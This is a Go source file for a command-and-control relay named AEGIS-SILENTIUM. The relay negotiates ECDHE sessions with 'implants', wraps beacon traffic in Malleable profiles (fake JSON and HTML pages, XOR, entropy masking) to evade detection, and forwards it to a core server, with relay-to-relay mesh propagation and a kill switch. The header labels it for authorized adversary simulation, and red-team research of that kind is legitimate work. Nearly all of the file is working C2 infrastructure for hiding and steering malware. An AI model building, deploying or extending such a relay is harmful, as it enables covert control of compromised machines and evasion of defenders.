// AEGIS-SILENTIUM Relay — Stateless, asynchronous reverse-proxy relay
// Language: Go 1.22+
// Role: Terminate TLS, authenticate ECDHE key exchange, strip/apply
//       Malleable C2 profile, forward raw encrypted payload to Intelligence
//       Core over WireGuard-authenticated mTLS. Holds no persistent state.
//
// Build:  go build -ldflags="-s -w" -trimpath -o relay ./main.go
// Run:    ./relay --config relay.yaml
//
// AUTHORIZED USE ONLY. For professional adversary simulation and
// proactive defense exercises in controlled environments.

package main

import (
	"bytes"
	"compress/gzip"
	"context"
	"crypto/ecdh"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"crypto/sha512"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"encoding/pem"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"math/big"
	"net"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"gopkg.in/yaml.v3"
)

// ────────────────────────────────────────────────────────────────────────────
// Configuration structures
// ────────────────────────────────────────────────────────────────────────────

type RelayConfig struct {
	Listen       ListenConfig    `yaml:"listen"`
	Core         CoreConfig      `yaml:"core"`
	Crypto       CryptoConfig    `yaml:"crypto"`
	Profile      ProfileConfig   `yaml:"profile"`
	Security     SecurityConfig  `yaml:"security"`
	Logging      LoggingConfig   `yaml:"logging"`
	Mesh         MeshConfig      `yaml:"mesh"`
}

type ListenConfig struct {
	Addr     string `yaml:"addr"`     // e.g. "0.0.0.0:443"
	CertFile string `yaml:"cert_file"`
	KeyFile  string `yaml:"key_file"`
	CAFile   string `yaml:"ca_file"`  // for mTLS with dashboard
}

type CoreConfig struct {
	URL        string        `yaml:"url"`         // e.g. "https://core.internal:5000"
	CACert     string        `yaml:"ca_cert"`
	ClientCert string        `yaml:"client_cert"`
	ClientKey  string        `yaml:"client_key"`
	Timeout    time.Duration `yaml:"timeout"`
}

type CryptoConfig struct {
	SigningKeyFile  string `yaml:"signing_key_file"` // ECDSA P-256 PEM — relay's long-term key
	RevocationFile string `yaml:"revocation_file"`  // JSON list of revoked node IDs
	MaxSessionAge  int    `yaml:"max_session_age"`  // seconds — discard ECDHE sessions after
}

type ProfileConfig struct {
	File        string `yaml:"file"`         // path to Malleable profile YAML
	FallbackRaw bool   `yaml:"fallback_raw"` // accept raw (unprofilied) beacons in dev mode
}

type SecurityConfig struct {
	RateLimit       int    `yaml:"rate_limit"`        // max requests/sec per IP
	MaxBodyBytes    int64  `yaml:"max_body_bytes"`
	AllowedNodeIDs  []string `yaml:"allowed_node_ids"` // empty = allow all
	KillSwitchFile  string `yaml:"kill_switch_file"`  // touch to kill all sessions
}

type LoggingConfig struct {
	Level  string `yaml:"level"`
	File   string `yaml:"file"`
	JSON   bool   `yaml:"json"`
}

type MeshConfig struct {
	PeerRelays []string `yaml:"peer_relays"` // other relay URLs for mesh propagation
	SharedKey  string   `yaml:"shared_key"`  // HMAC key for relay-to-relay auth
}

// ────────────────────────────────────────────────────────────────────────────
// Malleable C2 Profile
// ────────────────────────────────────────────────────────────────────────────

type MalleableProfile struct {
	Name    string             `yaml:"name"`
	Version string             `yaml:"version"`
	Client  TransformBlock     `yaml:"client"`
	Server  TransformBlock     `yaml:"server"`
	Headers map[string]string  `yaml:"default_headers"`
	URIs    []string           `yaml:"uris"`
}

type TransformBlock struct {
	Transforms []Transform `yaml:"transforms"`
	Container  string      `yaml:"container"` // json | html | png | raw
	Key        string      `yaml:"key"`        // JSON key or HTML comment anchor
}

type Transform struct {
	Op   string `yaml:"op"`   // base64 | base64url | gzip | xor | prepend | append | mask
	Arg  string `yaml:"arg"`  // optional argument
}

// Apply runs client-side transforms on plaintext payload → wire format
func (tb *TransformBlock) Apply(data []byte) ([]byte, error) {
	buf := make([]byte, len(data))
	copy(buf, data)
	for _, t := range tb.Transforms {
		var err error
		buf, err = applyTransform(buf, t)
		if err != nil {
			return nil, fmt.Errorf("transform %s: %w", t.Op, err)
		}
	}
	return wrapInContainer(buf, tb.Container, tb.Key)
}

// Strip reverses server-side transforms: wire format → plaintext payload
func (tb *TransformBlock) Strip(data []byte) ([]byte, error) {
	buf, err := unwrapContainer(data, tb.Container, tb.Key)
	if err != nil {
		return nil, fmt.Errorf("unwrap: %w", err)
	}
	for i := len(tb.Transforms) - 1; i >= 0; i-- {
		buf, err = reverseTransform(buf, tb.Transforms[i])
		if err != nil {
			return nil, fmt.Errorf("reverse %s: %w", tb.Transforms[i].Op, err)
		}
	}
	return buf, nil
}

func applyTransform(data []byte, t Transform) ([]byte, error) {
	switch t.Op {
	case "base64":
		out := make([]byte, base64.StdEncoding.EncodedLen(len(data)))
		base64.StdEncoding.Encode(out, data)
		return out, nil
	case "base64url":
		out := make([]byte, base64.URLEncoding.EncodedLen(len(data)))
		base64.URLEncoding.Encode(out, data)
		return out, nil
	case "gzip":
		var b bytes.Buffer
		w := gzip.NewWriter(&b)
		w.Write(data)
		w.Close()
		return b.Bytes(), nil
	case "xor":
		key := []byte(t.Arg)
		if len(key) == 0 {
			key = []byte{0x5A}
		}
		out := make([]byte, len(data))
		for i, b := range data {
			out[i] = b ^ key[i%len(key)]
		}
		return out, nil
	case "prepend":
		return append([]byte(t.Arg), data...), nil
	case "append":
		return append(data, []byte(t.Arg)...), nil
	case "mask":
		// Mask high-entropy bytes to look like ASCII dictionary words
		return maskEntropy(data), nil
	default:
		return data, nil
	}
}

func reverseTransform(data []byte, t Transform) ([]byte, error) {
	switch t.Op {
	case "base64":
		out := make([]byte, base64.StdEncoding.DecodedLen(len(data)))
		n, err := base64.StdEncoding.Decode(out, data)
		return out[:n], err
	case "base64url":
		out := make([]byte, base64.URLEncoding.DecodedLen(len(data)))
		n, err := base64.URLEncoding.Decode(out, data)
		return out[:n], err
	case "gzip":
		r, err := gzip.NewReader(bytes.NewReader(data))
		if err != nil {
			return nil, err
		}
		defer r.Close()
		return io.ReadAll(r)
	case "xor":
		return applyTransform(data, t) // XOR is its own inverse
	case "prepend":
		pfx := []byte(t.Arg)
		if bytes.HasPrefix(data, pfx) {
			return data[len(pfx):], nil
		}
		return data, nil
	case "append":
		sfx := []byte(t.Arg)
		if bytes.HasSuffix(data, sfx) {
			return data[:len(data)-len(sfx)], nil
		}
		return data, nil
	case "mask":
		return unmaskEntropy(data), nil
	default:
		return data, nil
	}
}

func wrapInContainer(data []byte, container, key string) ([]byte, error) {
	switch container {
	case "json":
		k := key
		if k == "" {
			k = "d"
		}
		m := map[string]interface{}{
			k:          string(data),
			"_t":       time.Now().Unix(),
			"_v":       "1.0",
			"clientId": pseudoRandomString(16),
		}
		return json.Marshal(m)
	case "html":
		anchor := key
		if anchor == "" {
			anchor = "data"
		}
		tpl := fmt.Sprintf("<!DOCTYPE html><html><head><title>Loading...</title></head>"+
			"<body><!-- %s:%s --><p>Please wait...</p></body></html>",
			anchor, string(data))
		return []byte(tpl), nil
	case "raw", "":
		return data, nil
	default:
		return data, nil
	}
}

func unwrapContainer(data []byte, container, key string) ([]byte, error) {
	switch container {
	case "json":
		k := key
		if k == "" {
			k = "d"
		}
		var m map[string]json.RawMessage
		if err := json.Unmarshal(data, &m); err != nil {
			return nil, err
		}
		raw, ok := m[k]
		if !ok {
			return nil, fmt.Errorf("key %q not found in JSON", k)
		}
		var s string
		if err := json.Unmarshal(raw, &s); err != nil {
			return nil, err
		}
		return []byte(s), nil
	case "html":
		anchor := key
		if anchor == "" {
			anchor = "data"
		}
		pfx := "<!-- " + anchor + ":"
		sfx := " -->"
		s := string(data)
		start := strings.Index(s, pfx)
		if start == -1 {
			return nil, errors.New("html anchor not found")
		}
		start += len(pfx)
		end := strings.Index(s[start:], sfx)
		if end == -1 {
			return nil, errors.New("html anchor close not found")
		}
		return []byte(s[start : start+end]), nil
	default:
		return data, nil
	}
}

// maskEntropy maps high-entropy bytes to plausible ASCII by base32-like encoding
func maskEntropy(data []byte) []byte {
	const alpha = "abcdefghijklmnopqrstuvwxyzABCDEF"
	out := make([]byte, len(data)*2)
	for i, b := range data {
		out[i*2] = alpha[b>>4]
		out[i*2+1] = alpha[b&0x0F]
	}
	return out
}

func unmaskEntropy(data []byte) []byte {
	const alpha = "abcdefghijklmnopqrstuvwxyzABCDEF"
	decode := func(c byte) byte {
		for i, a := range alpha {
			if byte(a) == c {
				return byte(i)
			}
		}
		return 0
	}
	out := make([]byte, len(data)/2)
	for i := range out {
		out[i] = (decode(data[i*2]) << 4) | decode(data[i*2+1])
	}
	return out
}

func pseudoRandomString(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	return base64.URLEncoding.EncodeToString(b)[:n]
}

// ────────────────────────────────────────────────────────────────────────────
// ECDHE Session Management (ephemeral, in-memory only)
// ────────────────────────────────────────────────────────────────────────────

type ECDHESession struct {
	NodeID     string
	SessionKey []byte // AES-256 derived key — never stored to disk
	CreatedAt  time.Time
	Nonce      []byte
}

type SessionStore struct {
	mu       sync.RWMutex
	sessions map[string]*ECDHESession // nonce → session
	maxAge   time.Duration
}

func NewSessionStore(maxAge time.Duration) *SessionStore {
	ss := &SessionStore{
		sessions: make(map[string]*ECDHESession),
		maxAge:   maxAge,
	}
	go ss.reaper()
	return ss
}

func (ss *SessionStore) Put(nonce string, sess *ECDHESession) {
	ss.mu.Lock()
	ss.sessions[nonce] = sess
	ss.mu.Unlock()
}

func (ss *SessionStore) Get(nonce string) (*ECDHESession, bool) {
	ss.mu.RLock()
	s, ok := ss.sessions[nonce]
	ss.mu.RUnlock()
	if !ok {
		return nil, false
	}
	if time.Since(s.CreatedAt) > ss.maxAge {
		ss.Delete(nonce)
		return nil, false
	}
	return s, true
}

func (ss *SessionStore) Delete(nonce string) {
	ss.mu.Lock()
	// Zero the session key before removal
	if s, ok := ss.sessions[nonce]; ok {
		for i := range s.SessionKey {
			s.SessionKey[i] = 0
		}
	}
	delete(ss.sessions, nonce)
	ss.mu.Unlock()
}

func (ss *SessionStore) reaper() {
	ticker := time.NewTicker(30 * time.Second)
	for range ticker.C {
		ss.mu.Lock()
		for k, s := range ss.sessions {
			if time.Since(s.CreatedAt) > ss.maxAge {
				for i := range s.SessionKey {
					s.SessionKey[i] = 0
				}
				delete(ss.sessions, k)
			}
		}
		ss.mu.Unlock()
	}
}

// ────────────────────────────────────────────────────────────────────────────
// Relay server
// ────────────────────────────────────────────────────────────────────────────

type Relay struct {
	cfg         *RelayConfig
	profile     *MalleableProfile
	signingKey  *ecdsa.PrivateKey
	sessions    *SessionStore
	coreClient  *http.Client
	revoked     map[string]bool
	revokedMu   sync.RWMutex
	reqCount    atomic.Int64
	rateLimiter sync.Map // ip → *rateBucket
	logger      *log.Logger
}

type rateBucket struct {
	tokens  float64
	lastRef time.Time
	mu      sync.Mutex
}

func (r *Relay) checkRate(ip string) bool {
	limit := float64(r.cfg.Security.RateLimit)
	if limit <= 0 {
		limit = 100
	}
	raw, _ := r.rateLimiter.LoadOrStore(ip, &rateBucket{tokens: limit, lastRef: time.Now()})
	rb := raw.(*rateBucket)
	rb.mu.Lock()
	defer rb.mu.Unlock()
	now := time.Now()
	elapsed := now.Sub(rb.lastRef).Seconds()
	rb.tokens += elapsed * limit
	if rb.tokens > limit {
		rb.tokens = limit
	}
	rb.lastRef = now
	if rb.tokens < 1 {
		return false
	}
	rb.tokens--
	return true
}

func (r *Relay) isRevoked(nodeID string) bool {
	r.revokedMu.RLock()
	defer r.revokedMu.RUnlock()
	return r.revoked[nodeID]
}

func (r *Relay) loadRevocationList() error {
	if r.cfg.Crypto.RevocationFile == "" {
		return nil
	}
	data, err := os.ReadFile(r.cfg.Crypto.RevocationFile)
	if err != nil {
		if os.IsNotExist(err) {
			return nil
		}
		return err
	}
	var ids []string
	if err := json.Unmarshal(data, &ids); err != nil {
		return err
	}
	m := make(map[string]bool, len(ids))
	for _, id := range ids {
		m[id] = true
	}
	r.revokedMu.Lock()
	r.revoked = m
	r.revokedMu.Unlock()
	r.logger.Printf("[relay] loaded %d revoked node IDs", len(ids))
	return nil
}

// ────────────────────────────────────────────────────────────────────────────
// HTTP Handlers
// ────────────────────────────────────────────────────────────────────────────

// handleHandshake: POST /h — ECDHE key exchange
//   Request body (JSON, optionally profile-wrapped):
//     { "node_id": "...", "pub_key": "<base64 ECDH P-256>", "nonce": "<base64 32B>" }
//   Response:
//     { "pub_key": "<relay ephemeral>", "nonce": "<relay nonce>", "sig": "<ECDSA sig>" }
func (r *Relay) handleHandshake(w http.ResponseWriter, req *http.Request) {
	ip, _, _ := net.SplitHostPort(req.RemoteAddr)
	if !r.checkRate(ip) {
		http.Error(w, "rate limit", http.StatusTooManyRequests)
		return
	}
	body, err := io.ReadAll(io.LimitReader(req.Body, 4096))
	if err != nil {
		http.Error(w, "bad body", http.StatusBadRequest)
		return
	}

	// Strip profile if present
	rawBody := body
	if r.profile != nil && !r.cfg.Profile.FallbackRaw {
		rawBody, err = r.profile.Client.Strip(body)
		if err != nil {
			r.logger.Printf("[relay] handshake profile strip failed: %v", err)
			http.Error(w, "profile error", http.StatusBadRequest)
			return
		}
	}

	var req2 struct {
		NodeID string `json:"node_id"`
		PubKey string `json:"pub_key"`
		Nonce  string `json:"nonce"`
	}
	if err := json.Unmarshal(rawBody, &req2); err != nil {
		http.Error(w, "bad json", http.StatusBadRequest)
		return
	}
	if r.isRevoked(req2.NodeID) {
		r.logger.Printf("[relay] rejected revoked node %s", req2.NodeID)
		http.Error(w, "forbidden", http.StatusForbidden)
		return
	}

	// Decode implant ephemeral public key
	implantPubBytes, err := base64.StdEncoding.DecodeString(req2.PubKey)
	if err != nil {
		http.Error(w, "bad pub_key", http.StatusBadRequest)
		return
	}
	curve := ecdh.P256()
	implantPub, err := curve.NewPublicKey(implantPubBytes)
	if err != nil {
		http.Error(w, "invalid pub_key", http.StatusBadRequest)
		return
	}

	// Generate relay ephemeral key pair
	relayPriv, err := curve.GenerateKey(rand.Reader)
	if err != nil {
		http.Error(w, "keygen failed", http.StatusInternalServerError)
		return
	}
	relayPub := relayPriv.PublicKey()

	// Perform ECDH
	sharedSecret, err := relayPriv.ECDH(implantPub)
	if err != nil {
		http.Error(w, "ecdh failed", http.StatusInternalServerError)
		return
	}

	// Derive session key via HKDF-SHA256
	// info = nodeID + client_nonce + relay_nonce
	relayNonce := make([]byte, 32)
	rand.Read(relayNonce)
	clientNonce, _ := base64.StdEncoding.DecodeString(req2.Nonce)
	sessionKey := hkdfDerive(sharedSecret, append(clientNonce, relayNonce...),
		[]byte("aegis-silentium-session-key-v1:"+req2.NodeID))

	// Store session (ephemeral — never written to disk)
	nonceHex := base64.StdEncoding.EncodeToString(clientNonce)
	r.sessions.Put(nonceHex, &ECDHESession{
		NodeID:     req2.NodeID,
		SessionKey: sessionKey,
		CreatedAt:  time.Now(),
		Nonce:      clientNonce,
	})

	// Sign response with relay's long-term ECDSA key
	sigPayload := append(relayPub.Bytes(), relayNonce...)
	h := sha256.Sum256(sigPayload)
	sig, _ := r.signingKey.Sign(rand.Reader, h[:], nil)

	resp := map[string]string{
		"pub_key": base64.StdEncoding.EncodeToString(relayPub.Bytes()),
		"nonce":   base64.StdEncoding.EncodeToString(relayNonce),
		"sig":     base64.StdEncoding.EncodeToString(sig),
	}
	respBytes, _ := json.Marshal(resp)

	// Apply server profile
	if r.profile != nil {
		respBytes, err = r.profile.Server.Apply(respBytes)
		if err != nil {
			r.logger.Printf("[relay] profile apply failed: %v", err)
		}
	}

	w.Header().Set("Content-Type", "application/json")
	for k, v := range r.profile.Headers {
		w.Header().Set(k, v)
	}
	w.WriteHeader(http.StatusOK)
	w.Write(respBytes)

	// Zero ephemeral private key — PFS
	relayPrivBytes := relayPriv.Bytes()
	for i := range relayPrivBytes {
		relayPrivBytes[i] = 0
	}
	r.logger.Printf("[relay] ECDHE handshake completed for node=%s", req2.NodeID)
}

// handleBeacon: POST /b — receive beacon, forward to core
func (r *Relay) handleBeacon(w http.ResponseWriter, req *http.Request) {
	ip, _, _ := net.SplitHostPort(req.RemoteAddr)
	if !r.checkRate(ip) {
		http.Error(w, "rate limit", http.StatusTooManyRequests)
		return
	}
	r.reqCount.Add(1)

	body, err := io.ReadAll(io.LimitReader(req.Body, r.cfg.Security.MaxBodyBytes))
	if err != nil {
		http.Error(w, "bad body", http.StatusBadRequest)
		return
	}

	// Strip Malleable profile wrapper → get encrypted AES-GCM payload
	rawPayload := body
	if r.profile != nil {
		rawPayload, err = r.profile.Client.Strip(body)
		if err != nil {
			http.Error(w, "profile error", http.StatusBadRequest)
			return
		}
	}

	// Extract nonce header to look up session
	clientNonce := req.Header.Get("X-Aegis-Nonce")
	if clientNonce == "" {
		http.Error(w, "missing nonce", http.StatusBadRequest)
		return
	}
	sess, ok := r.sessions.Get(clientNonce)
	if !ok {
		// Session expired or unknown — implant must re-handshake
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]string{"action": "rehandshake"})
		return
	}
	if r.isRevoked(sess.NodeID) {
		http.Error(w, "forbidden", http.StatusForbidden)
		return
	}

	// Verify HMAC on payload (the session key is used for both encryption + auth)
	if len(rawPayload) < 32 {
		http.Error(w, "payload too short", http.StatusBadRequest)
		return
	}
	mac := rawPayload[:32]
	payload := rawPayload[32:]
	expectedMac := computeHMAC(sess.SessionKey, payload)
	if !hmac.Equal(mac, expectedMac) {
		r.logger.Printf("[relay] HMAC mismatch for node=%s — possible replay", sess.NodeID)
		http.Error(w, "authentication failed", http.StatusUnauthorized)
		return
	}

	// Forward to intelligence core over authenticated mTLS channel
	coreResp, err := r.forwardToCore(sess.NodeID, payload)
	if err != nil {
		r.logger.Printf("[relay] core forward failed for node=%s: %v", sess.NodeID, err)
		http.Error(w, "core error", http.StatusBadGateway)
		return
	}

	// Compute HMAC on response and prepend
	respMac := computeHMAC(sess.SessionKey, coreResp)
	wireResp := append(respMac, coreResp...)

	// Apply server Malleable profile
	if r.profile != nil {
		wireResp, err = r.profile.Server.Apply(wireResp)
		if err != nil {
			r.logger.Printf("[relay] profile apply on response: %v", err)
		}
	}

	w.Header().Set("Content-Type", "application/json")
	for k, v := range r.profile.Headers {
		w.Header().Set(k, v)
	}
	w.WriteHeader(http.StatusOK)
	w.Write(wireResp)
}

// handleMesh: POST /m — relay-to-relay mesh message propagation
func (r *Relay) handleMesh(w http.ResponseWriter, req *http.Request) {
	if r.cfg.Mesh.SharedKey == "" {
		http.Error(w, "mesh disabled", http.StatusNotFound)
		return
	}
	body, err := io.ReadAll(io.LimitReader(req.Body, 65536))
	if err != nil {
		http.Error(w, "bad body", http.StatusBadRequest)
		return
	}
	var msg struct {
		HMAC    string          `json:"hmac"`
		Payload json.RawMessage `json:"payload"`
	}
	if err := json.Unmarshal(body, &msg); err != nil {
		http.Error(w, "bad json", http.StatusBadRequest)
		return
	}
	expectedHMAC := fmt.Sprintf("%x", computeHMAC([]byte(r.cfg.Mesh.SharedKey), msg.Payload))
	if msg.HMAC != expectedHMAC {
		http.Error(w, "mesh auth failed", http.StatusUnauthorized)
		return
	}
	// Forward to core
	r.forwardToCore("mesh", msg.Payload)
	w.WriteHeader(http.StatusAccepted)
}

func (r *Relay) forwardToCore(nodeID string, payload []byte) ([]byte, error) {
	coreURL := r.cfg.Core.URL + "/api/relay/ingest"
	body := bytes.NewReader(payload)
	coreReq, err := http.NewRequest("POST", coreURL, body)
	if err != nil {
		return nil, err
	}
	coreReq.Header.Set("Content-Type", "application/octet-stream")
	coreReq.Header.Set("X-Relay-Node", nodeID)
	coreReq.Header.Set("X-Relay-Time", fmt.Sprintf("%d", time.Now().Unix()))

	resp, err := r.coreClient.Do(coreReq)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("core returned %d", resp.StatusCode)
	}
	return io.ReadAll(io.LimitReader(resp.Body, 1<<20))
}

// ────────────────────────────────────────────────────────────────────────────
// Crypto helpers
// ────────────────────────────────────────────────────────────────────────────

func hkdfDerive(secret, salt, info []byte) []byte {
	// HKDF-SHA256 (RFC 5869) — simplified single-pass
	// Extract
	if len(salt) == 0 {
		salt = make([]byte, 32) // zeroed salt
	}
	h := hmac.New(sha256.New, salt)
	h.Write(secret)
	prk := h.Sum(nil)
	// Expand
	h2 := hmac.New(sha256.New, prk)
	h2.Write(info)
	h2.Write([]byte{0x01})
	return h2.Sum(nil) // 32 bytes = AES-256 key
}

func computeHMAC(key, data []byte) []byte {
	h := hmac.New(sha512.New512_256, key)
	h.Write(data)
	return h.Sum(nil)
}

// ────────────────────────────────────────────────────────────────────────────
// Key loading helpers
// ────────────────────────────────────────────────────────────────────────────

func loadECDSAPrivKey(path string) (*ecdsa.PrivateKey, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	block, _ := pem.Decode(data)
	if block == nil {
		return nil, errors.New("failed to decode PEM")
	}
	return x509.ParseECPrivateKey(block.Bytes)
}

func buildCoreClient(cfg CoreConfig) (*http.Client, error) {
	caCert, err := os.ReadFile(cfg.CACert)
	if err != nil {
		return nil, fmt.Errorf("read core CA: %w", err)
	}
	caPool := x509.NewCertPool()
	caPool.AppendCertsFromPEM(caCert)

	clientCert, err := tls.LoadX509KeyPair(cfg.ClientCert, cfg.ClientKey)
	if err != nil {
		return nil, fmt.Errorf("load client cert: %w", err)
	}

	tlsCfg := &tls.Config{
		RootCAs:      caPool,
		Certificates: []tls.Certificate{clientCert},
		MinVersion:   tls.VersionTLS13,
	}
	transport := &http.Transport{TLSClientConfig: tlsCfg}
	return &http.Client{Transport: transport, Timeout: cfg.Timeout}, nil
}

// ────────────────────────────────────────────────────────────────────────────
// Health + metrics
// ────────────────────────────────────────────────────────────────────────────

func (r *Relay) handleHealth(w http.ResponseWriter, _ *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":    "ok",
		"requests":  r.reqCount.Load(),
		"goroutines": runtime.NumGoroutine(),
		"uptime":    time.Since(startTime).String(),
	})
}

var startTime = time.Now()

// ────────────────────────────────────────────────────────────────────────────
// Kill-switch watcher
// ────────────────────────────────────────────────────────────────────────────

func (r *Relay) watchKillSwitch(cancel context.CancelFunc) {
	f := r.cfg.Security.KillSwitchFile
	if f == "" {
		return
	}
	ticker := time.NewTicker(5 * time.Second)
	for range ticker.C {
		if _, err := os.Stat(f); err == nil {
			r.logger.Printf("[relay] kill switch triggered — shutting down")
			cancel()
			return
		}
	}
}

// ────────────────────────────────────────────────────────────────────────────
// Revocation list watcher
// ────────────────────────────────────────────────────────────────────────────

func (r *Relay) watchRevocationList() {
	ticker := time.NewTicker(60 * time.Second)
	for range ticker.C {
		if err := r.loadRevocationList(); err != nil {
			r.logger.Printf("[relay] revocation list reload error: %v", err)
		}
	}
}

// ────────────────────────────────────────────────────────────────────────────
// main
// ────────────────────────────────────────────────────────────────────────────

func main() {
	cfgPath := flag.String("config", "relay.yaml", "Path to relay config YAML")
	flag.Parse()

	// Load config
	cfgData, err := os.ReadFile(*cfgPath)
	if err != nil {
		log.Fatalf("cannot read config: %v", err)
	}
	var cfg RelayConfig
	if err := yaml.Unmarshal(cfgData, &cfg); err != nil {
		log.Fatalf("cannot parse config: %v", err)
	}

	// Setup logger
	var logOut io.Writer = os.Stdout
	if cfg.Logging.File != "" {
		f, err := os.OpenFile(cfg.Logging.File, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
		if err != nil {
			log.Fatalf("cannot open log file: %v", err)
		}
		defer f.Close()
		logOut = io.MultiWriter(os.Stdout, f)
	}
	logger := log.New(logOut, "[relay] ", log.LstdFlags|log.Lmicroseconds)

	// Load signing key
	signingKey, err := loadECDSAPrivKey(cfg.Crypto.SigningKeyFile)
	if err != nil {
		log.Fatalf("cannot load signing key: %v", err)
	}

	// Load Malleable profile
	var profile *MalleableProfile
	if cfg.Profile.File != "" {
		profData, err := os.ReadFile(cfg.Profile.File)
		if err != nil {
			log.Fatalf("cannot read profile: %v", err)
		}
		profile = &MalleableProfile{}
		if err := yaml.Unmarshal(profData, profile); err != nil {
			log.Fatalf("cannot parse profile: %v", err)
		}
		logger.Printf("loaded Malleable profile: %s v%s", profile.Name, profile.Version)
	}

	// Build core mTLS client
	coreClient, err := buildCoreClient(cfg.Core)
	if err != nil {
		log.Fatalf("cannot build core client: %v", err)
	}

	maxAge := time.Duration(cfg.Crypto.MaxSessionAge) * time.Second
	if maxAge == 0 {
		maxAge = 300 * time.Second
	}

	relay := &Relay{
		cfg:        &cfg,
		profile:    profile,
		signingKey: signingKey,
		sessions:   NewSessionStore(maxAge),
		coreClient: coreClient,
		revoked:    make(map[string]bool),
		logger:     logger,
	}
	relay.loadRevocationList()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go relay.watchKillSwitch(cancel)
	go relay.watchRevocationList()

	// URI routing — pick a random URI from profile or use defaults
	uris := []string{"/b", "/h", "/m", "/health"}
	if profile != nil && len(profile.URIs) > 0 {
		uris = profile.URIs
	}

	mux := http.NewServeMux()
	mux.HandleFunc(uris[0], relay.handleBeacon)
	if len(uris) > 1 {
		mux.HandleFunc(uris[1], relay.handleHandshake)
	} else {
		mux.HandleFunc("/h", relay.handleHandshake)
	}
	mux.HandleFunc("/m", relay.handleMesh)
	mux.HandleFunc("/health", relay.handleHealth)

	// TLS server — TLS 1.3 only
	tlsCfg := &tls.Config{
		MinVersion: tls.VersionTLS13,
		CurvePreferences: []tls.CurveID{
			tls.X25519,
			tls.CurveP256,
		},
	}

	server := &http.Server{
		Addr:         cfg.Listen.Addr,
		Handler:      mux,
		TLSConfig:    tlsCfg,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 60 * time.Second,
		IdleTimeout:  120 * time.Second,
	}

	// Graceful shutdown
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGTERM, syscall.SIGINT)
	go func() {
		select {
		case <-sigCh:
		case <-ctx.Done():
		}
		logger.Printf("shutting down relay...")
		shutCtx, shutCancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer shutCancel()
		server.Shutdown(shutCtx)
	}()

	absKey, _ := filepath.Abs(cfg.Listen.KeyFile)
	absCert, _ := filepath.Abs(cfg.Listen.CertFile)
	logger.Printf("AEGIS-SILENTIUM Relay starting on %s (TLS 1.3)", cfg.Listen.Addr)
	if err := server.ListenAndServeTLS(absCert, absKey); err != nil && err != http.ErrServerClosed {
		log.Fatalf("relay failed: %v", err)
	}
}

// Suppress unused import warnings for big.Int (used in key serialisation path)
var _ = big.NewInt
var _ = binary.BigEndian
